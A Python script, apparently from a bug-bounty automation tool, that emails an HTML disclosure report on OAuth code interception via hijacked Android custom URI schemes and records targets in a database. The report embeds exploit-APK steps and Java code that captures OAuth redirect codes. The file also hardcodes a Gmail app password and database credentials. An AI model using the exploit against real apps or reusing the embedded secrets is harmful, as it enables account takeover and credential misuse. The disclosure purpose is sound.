"""
This file takes input URLs and emails for the same domain, and reports them a clickjacking vulnerability.
If mails are more than one, it seperates them into another file, so you can decide which one to mail.

Example Input:

https://lego.com/.well-known/security.txt, whitehat@lego.com
https://yoast.com/.well-known/security.txt, security@yoast.com
https://httpwg.org/.well-known/security.txt, httpbis-chairs@ietf.org, ietf-http-wg@w3.org, ietf-http-wg-request@w3.org
https://rferl.org/.well-known/security.txt, vulnerability_disclosure@usagm.gov
https://unimelb.edu.au/.well-known/security.txt, it-security@unimelb.edu.au
https://telenor.no/.well-known/security.txt, tsoc@tsoc.telenor.net
https://fu-berlin.de/.well-known/security.txt, abuse@fu-berlin.de
https://smartsheet.com/.well-known/security.txt, security@smartsheet.com
https://meltwater.com/.well-known/security.txt, security@meltwater.com
https://ethereum.org/.well-known/security.txt, security@ethereum.org
 
"""
import json
import smtplib
import ssl
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from urllib.parse import urlparse
import logging
# from app.services.sendReports.db.db_manager import *

from app.db.db_manager import DatabaseManager
from app.db.db_operations import DatabaseOperations

# from app.testDB.db_manager import DatabaseManager
# from app.testDB.db_operations import DatabaseOperations

db_config = {
    'dbname': 'test_monitor',
    'user': 'postgres',
    'password': 'postgres',
    'host': 'localhost'
}
db_manager = DatabaseManager(db_config)
db_ops = DatabaseOperations(db_manager)


# Gmail SMTP server details
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465

# Email credentials
SENDER_EMAIL = "riley.quinn.mail@gmail.com"  # Replace with your Gmail address
SENDER_PASSWORD = "mvto dzkn bsoi hgmv"      # Replace with your Gmail app password

# Log files
SUCCESS_LOG = "email_success.log"
FAILURE_LOG = "email_failure.log"

# Store domains from success logs
processed_domains = set()

logging.basicConfig(
    level=logging.INFO,  # Set logging level to DEBUG
    format='%(asctime)s - %(levelname)s - %(filename)s:%(lineno)d - %(message)s',
    handlers=[
        logging.FileHandler('endpoint_monitor.log', mode='a'),  # Append mode for the log file
        logging.StreamHandler()  # Print logs to the terminal
    ]
)

# Create a logger for the class
logger = logging.getLogger()  # Use the class name for better context
logger.setLevel(logging.INFO)  # Ensure the logger level is set to DEBUG


# Function to send email
def send_email(program_name, program_url, technology, email, poc_path, target_package, target_apk, download_url, attachment_url, report_form, acquisitions):
    receiver_email = email
    message = MIMEMultipart("alternative")
    message["Subject"] = f"Vulnerability Disclosure Report - {program_name}"
    message["From"] = SENDER_EMAIL
    message["To"] = receiver_email

    html_content = f"""
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>OAuth Account Takeover Report</title>
    <style>
      body {{
            font-family: Georgia, serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            margin: 0;
      }}

      header {{
        color: white;
        text-align: center;
      }}

      section {{
        margin: auto;
        background: white;
        border-radius: 8px;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        max-width: 800px;
      }}

      h1 {{
        font-size: 28px;          
        color: #2c3e50;
        border-bottom: 3px solid #ddd;

      }}
      
      h2 {{
        font-size: 22px;
        color: #2c3e50;
        border-bottom: 2px solid #ddd;

      }}
      
      h3 {{
        font-size: 18px;
        color: #2c3e50;

      }}

    p {{
        font-size: 16px;
        color: #555;
        line-height: 1.6;
        margin-bottom: 10px;
    }}
      code {{
        display: block;
        background: #f4f4f4;
        border-left: 5px solid #2c3e50;
        padding: 10px;
        margin: 10px 0;
        overflow-x: auto;
        font-family: monospace;
        white-space: pre-wrap; /* Preserve spaces and line breaks */
      }}

      a {{
        color: #2c3e50;
        text-decoration: none;
      }}

      a:hover {{
        text-decoration: underline;
      }}

      ul {{
        padding-left: 20px;
      }}

      ul li {{
        margin-bottom: 10px;
      }}

      pre {{
        white-space: pre-wrap;
      }}

      footer {{
        text-align: center;
        margin: 20px;
        font-size: 0.9em;
        color: #666;
      }}
    </style>
  </head>

  <body>
    <header>
      <h1>
        OAuth Account Takeover Through Mobile App Impersonation in {program_name} APK
      </h1>
    </header>

    <section>
      <h2>Description</h2>
      <p>
        Mobile app impersonation is a form of identity theft where malicious
        actors create fraudulent mobile applications that mimic legitimate
        OAuth-enabled apps. These malicious apps trick users into providing
        their OAuth credentials, subsequently leading to unauthorized account
        access. The attacker can then misuse the stolen access tokens to
        impersonate the victim, leading to potential data breaches and
        unauthorized actions on the victim's behalf.
      </p>
      <p>
        One key assumption made during OAuth authentication flow is the
        ownership of the entity that redirect_uri points to, in the case of
        <b>redirect_uri=https://www.clientapp.com/callback/oauth</b>, we assume
        <b>www.clientapp.com</b> belongs to the client app since they're the ones who
        configured it as <b>redirect_uri</b> and they're the only ones who can claim
        that domain.
      </p>
      <p>
        In the case of mobile apps, the typical implementation for OAuth on
        mobile relies on custom schemes like
        <b>redirect_uri=com.target.app://oauth</b>, the problem here is that any
        application on the user device can register this scheme and receive the
        OAuth grant that was meant for the legitimate application.
      </p>
      <p>
        In order for an application to register a custom URI scheme, it has to
        declare it by adding an intent filter to its manifest similar to this
        one:
        <code>
    &lt;activity android:exported&#x3D;&quot;true&quot; android:name&#x3D;&quot;PACKAGE_NAME.CLASS_NAME&quot;&gt;
        &lt;intent-filter&gt; &lt;action android:name&#x3D;&quot;android.intent.action.VIEW&quot;&#x2F;&gt;
        &lt;category android:name&#x3D;&quot;android.intent.category.DEFAULT&quot;&#x2F;&gt;
        &lt;category android:name&#x3D;&quot;android.intent.category.BROWSABLE&quot;&#x2F;&gt;
        &lt;data android:host&#x3D;&quot;oauth&quot; android:scheme&#x3D;&quot;com.target.app&quot;&#x2F;&gt;
    &lt;&#x2F;intent-filter&gt; &lt;&#x2F;activity&gt;
        </code>
      </p>
      <p>
        It is possible for two apps to register the same scheme, in this case
        the system can differentiate between the two apps using other attributes
        such as host, port, path and mime type, in case where both apps have the
        same attributes, the system will let the user decide which app to use to
        continue
      </p>
    </section>

    <section>
      <h2>Steps to Reproduce</h2>
      <p><strong>PoC is attached for better understanding</strong><p>
      <h3>Finding Vulnerable Custom URI</h3>
      <ul>
        <li><p>Decompile {program_name} APK.</p></li>
        <li><p>Go to <em>AndroidManifest.xml</em>.</p></li>
        <li><p>
          Search for intent filters receiving URIs containing sensitive data
          like tokens or codes.
        </p></li>
      </ul>
      <h3>Making Exploit APK</h3>
      <ul>
        <li><p>Create a new Android Studio Project.</p></li>
        <li><p>Create an empty Activity.</p></li>
        <li>
          <p>In <em>AndroidManifest.xml</em>, add the intent filter found in the
          {program_name} APK.
        </p></li>
        <li>
          <p>Add the following code to <em>MainActivity.java</em> to intercept the
          OAuth token:
        </p></li>
      </ul>
      <code>
        import android.content.ClipData;
        import android.content.ClipboardManager;
        import android.content.Intent;
        import android.net.Uri;
        import android.os.Bundle;
        import android.view.View;
        import android.widget.Button;
        import android.widget.TextView;
        import android.widget.Toast;
        import androidx.appcompat.app.AppCompatActivity;
        
        /* loaded from: classes.dex */
        public class MainActivity extends AppCompatActivity {{
            /* JADX INFO: Access modifiers changed from: protected */
            @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
            public void onCreate(Bundle bundle) {{
                Uri data;
                super.onCreate(bundle);
                setContentView(R.layout.activity_main);
                TextView textView = (TextView) findViewById(R.id.titleTextView);
                TextView textView2 = (TextView) findViewById(R.id.textView);
                Button button = (Button) findViewById(R.id.copyButton);
                button.setVisibility(8);
                Intent intent = getIntent();
                if (!"android.intent.action.VIEW".equals(intent.getAction()) || (data = intent.getData()) == null) {{
                    return;
                }}
                final String uri = data.toString();
                textView.setText("OAuth Code Leaked Successfully");
                textView2.setText(uri);
                button.setVisibility(0);
                button.setOnClickListener(new View.OnClickListener() {{ // from class: com.oauth.exploitfb1.MainActivity.1
                    @Override // android.view.View.OnClickListener
                    public void onClick(View view) {{
                        ((ClipboardManager) MainActivity.this.getSystemService("clipboard")).setPrimaryClip(ClipData.newPlainText("URL", uri));
                        Toast.makeText(MainActivity.this, "Data copied to clipboard", 0).show();
                    }}
                }});
                Toast.makeText(this, "Data received", 0).show();
            }}
        }}
    </code>
      <ul>
        <li><p>Build and sign the APK.</p></li>
        <li><p>Install & Exploit.</p></li>
      </ul>
    </section>

    <section>
      <h2>Impact</h2>
      <ul>
        <li><p><strong>Data Breaches:</strong> Access to sensitive data.</p></li>
        <li>
          <p><strong>Identity Theft:</strong> Impersonation using stolen tokens.</p>
        </li>
        <li><p><strong>Financial Loss:</strong> Unauthorized transactions.</p></li>
        <li>
          <p><strong>Reputation Damage:</strong> For both users and providers.</p>
        </li>
      </ul>
    </section>

    <section>
      <h2>Recommendations</h2>
      <p>
        In the context of OAuth, Custom schemes have been used traditionally,
        but there are more secure and reliable options available, notably:
      </p>
      <ul>
        <li><p>
          App to app integration like Google Identity Services and Facebook
          Express Login for Android:
          <strong
            ><a
              href="https://developer.android.com/training/app-links/verify-android-applinks"
              >Link</a
            ></strong
          ></p>
        </li>
        <li><p>
          Use Android Verifiable App Links and iOS Associated Domains for secure OAuth flows:
          <ul>
            <li>
            <p>
                Android Verifiable App Links and iOS Associated Domains are mechanisms implemented by Android and iOS operating systems, respectively, to enhance the security and user experience of mobile applications. Android Verifiable App Links ensure that when a user clicks a web link associated with an Android app, the system verifies its authenticity, making it less susceptible to phishing or malicious attacks. iOS Associated Domains, on the other hand, enable iOS apps to establish trusted connections with specific web domains, allowing for seamless integration between apps and web content, such as single sign-on and universal links. Both technologies serve to strengthen the trustworthiness of mobile app interactions and streamline user interactions, contributing to a safer and more convenient mobile ecosystem.
            </p>
            </li>
          </ul>
        </p></li>
      </ul>
      <h3>How To Implement (Android Verifiable App Links)</h3>
      <p>
        You need to have /.well-known/assetlinks.json hosted on your backend
        with a format like this:
      </p>
      <strong>Sample assetlinks.json content</strong>
      <code>
    [
        {{
          "relation": [
            "delegate_permission/common.handle_all_urls",
            "delegate_permission/common.get_login_creds"
          ],
          "target": {{
            "namespace": "android_app",
            "package_name": "com.myapplication.android",
            "sha256_cert_fingerprints": [
              "APPLICATION_CERT_FINGERPRINT"
            ]
          }}
        }}
    ]
    </code>

      <strong>Sample AndroidManifest.xml Code</strong>
      <code>
        &lt;intent-filter android:autoVerify&#x3D;&quot;true&quot;&gt;
            &lt;action android:name&#x3D;&quot;android.intent.action.VIEW&quot; &#x2F;&gt;
            &lt;category android:name&#x3D;&quot;android.intent.category.DEFAULT&quot; &#x2F;&gt;
            &lt;category android:name&#x3D;&quot;android.intent.category.BROWSABLE&quot; &#x2F;&gt;

            &lt;!-- If a user clicks on a shared link that uses the &quot;http&quot; scheme, your 
                   app should be able to delegate that traffic to &quot;https&quot;. --&gt;
                   
            &lt;data android:scheme&#x3D;&quot;http&quot; &#x2F;&gt;
            &lt;data android:scheme&#x3D;&quot;https&quot; &#x2F;&gt;

            &lt;!-- Include one or more domains that should be verified. --&gt;
            &lt;data android:host&#x3D;&quot;auth.myapp.com&quot; &#x2F;&gt;
        &lt;&#x2F;intent-filter&gt;
      </code>

      <strong>Sample Kotlin Code</strong>
      <code>
        Log.i(TAG, "Creating auth request for login hint: $loginHint")
        val authRequestBuilder: AuthorizationRequest.Builder = Builder(
            mAuthStateManager.getCurrent().getAuthorizationServiceConfiguration(),
            mClientId.get(),
            ResponseTypeValues.CODE,
            "https://auth.myapp.com/oauth/handler" // The redirect URI with an https scheme
        )
            .setScope(mConfiguration.getScope())
        if (!TextUtils.isEmpty(loginHint)) {{
            authRequestBuilder.setLoginHint(loginHint)
        }}
        mAuthRequest.set(authRequestBuilder.build())
              </code>
    </section>

    <section>
        <h2>Reference:</h2>
        <ul>
            <li>
                https://developers.googleblog.com/2023/10/enhancing-oauth-app-impersonation-protections.html
            </li>
            <li>
                https://developer.android.com/training/app-links/verify-android-applinks
            </li>
            <li>
                https://blog.ostorlab.co/one-scheme-to-rule-them-all.html
            </li>
        </ul>
    </section>

    <footer>
    <strong><p>Best Regards <br/> Riley Quinn ;)</p></strong>
    </footer>
  </body>
</html>
    """    
    responses = []

    part = MIMEText(html_content, "html")
    message.attach(part)
    if poc_path != None:
        try:
            with open(poc_path, "rb") as attachment:
                poc_part = MIMEBase("application", "octet-stream")
                poc_part.set_payload(attachment.read())
                encoders.encode_base64(poc_part)
                poc_part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(poc_path)}")
                message.attach(poc_part)
        except Exception as e:
            print(f"[FILE NOT FOUND] Attachment file not found - [{e}]")
            responses.append(f"Error: Attachment file not found: [{e}]")
            responses.append(f"Error: Email not sent")
            return responses
    context = ssl.create_default_context()

    try:
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, context=context) as server:
            # server.login(SENDER_EMAIL, SENDER_PASSWORD)
            # server.sendmail(SENDER_EMAIL, receiver_email, message.as_string())
            print(f"[FAKE] - Mail sent [{email}] - [{target_package}]")
            responses.append("Success: Email Sent!")

        result = log_success(program_name, program_url, technology, email, poc_path, target_package, target_apk, download_url, attachment_url, report_form, acquisitions)
        if result is not None:
            responses.extend(result)
        
    except Exception as e:
        logging.exception("An error occurred")
        log_failure(email, str(e))
        print(f"Email not sent: [{e}]")
        responses.append(f"Error: Email not sent: {e}")
        
    return responses
# Function to log successful emails
def log_success(program_name, program_url, technology, email, poc_path, target_package, target_apk, download_url, attachment_url, report_form, acquisitions):
    responses = []
    if db_ops.query_operations().check_program_exists(program_name=program_name):
        logger.info(f"Program [{program_name}] exists.")
        if db_ops.query_operations().check_mobile_target_exists(target_package):
            logger.info(f"Target [{target_package}] exists.")
            
            target_id = db_ops.query_operations().get_mobile_target_data(target_package=target_package)[0][0]
            logger.info(f"Got mobile target data {target_id}")
            db_ops.update_operations().update_mobile_target_vuln(target_id, vulnerability_reported={'vulnerability_reported': 'OAuth'})
            logger.info(f"Updated mobile target vuln for {target_package}")

        else:
        # Insert Target
            logger.info(f"Target [{target_package}] doesn't exists.")
            program_id = db_ops.query_operations().get_program_details(program_name=program_name)[0][0] # Get Program ID
            logger.info(f"Got program ID [{program_id}]")

            mobile_target_data = {
                'program_id': program_id,
                'target_package': target_package,
                'target_apk': target_apk,
                'technology': technology,
                'download_url': download_url,
                'vulnerability_reported': ['OAuth']
            }
            
            db_ops.insert_operations().insert_mobile_target(mobile_target_data)
            logger.info(f"Created target [{target_package}]")

    else:
        logger.info(f"Program {program_name} doesn't exists")
        
        program_data = {
            'program_name': program_name,
            'program_url': program_url,
            'acquisitions': acquisitions,
            'email': email,
            'report_form': report_form
        }
        # Insert Program
        program_id = db_ops.insert_operations().insert_program(program_data)
        logger.info(f"Created progam [{program_id}]")

        
        # Insert Target
                    
        mobile_target_data = {
            'program_id': program_id,
            'target_package': target_package,
            'target_apk': target_apk,
            'technology': technology,
            'download_url': download_url,
            'vulnerability_reported': ['OAuth']
        }
        
        target_id = db_ops.insert_operations().insert_mobile_target(mobile_target_data)
        logger.info(f"Created target [{target_package}] - [{target_id}]")
        
    with open(SUCCESS_LOG, "a") as f:
        f.write(f"{datetime.now()} - Email sent to: {email}\n")

# Function to log failed emails
def log_failure(email, error):
    with open(FAILURE_LOG, "a") as f:
        f.write(f"{datetime.now()} - Failed to send email to: {email} - Error: {error}\n")


def process_file(report):
    """Reads the input file, checks the conditions, and processes accordingly."""
    responses = []
    program_name = report["program_name"]
    email = report["email"]
    target_package = report["target_package"]
    target_apk = report["target_apk"]
    download_url = report["download_url"]
    attachment_url = report["attachment_url"]
    program_url = report["program_url"]
    technology = report["technology"]
    report_form = report["report_form"]
    acquisitions = report["acquisitions"]

    if db_ops.query_operations().check_mobile_target_vuln_exists(vulnerability_reported="OAuth", target_package=target_package):
        print(f"[ALREADY REPORTED] [OAuth] - [{target_package}]")
        responses.append(f"Info: Already reported!")
        return responses

    
    try:
        poc_path = report.get("poc_path", None)
        if poc_path == "":
            poc_path = None
        if poc_path:
            print(f"[INFO] Attachment provided - [{target_package}] - [{poc_path}]")
            responses.append(f"Info: Attachment provided: [{poc_path}]")
        else:
            print(f"[INFO] No attachment provided - [{target_package}]")
            responses.append(f"Info: Attachment not provided")
    except Exception as e:
        poc_path = None
        print(f"[INFO] No attachment provided - [{target_package}]")
        responses.append(f"Error: Attachment not provided: [{e}]")
    print(f"[INFO] Sending email [{program_name}] - [{email}]")
    if responses.extend(send_email(program_name, program_url, technology, email, poc_path, target_package, target_apk, download_url, attachment_url, report_form, acquisitions)):
        processed_domains.add(program_name)
                
    return responses
# Main function
def oauth_send_mail(report):
    global processed_domains
    
    # parser = argparse.ArgumentParser(description="Send emails to domain security contacts.")
    # parser.add_argument("-f", "--file", required=True, help="File containing list of URLs/domains")
    # args = parser.parse_args()
    # if process_file(reports):
        # return f"Mail sent successfully to {reports[0]["email"]}"
    # else: 
        # return "Something went wrong"
    return process_file(report)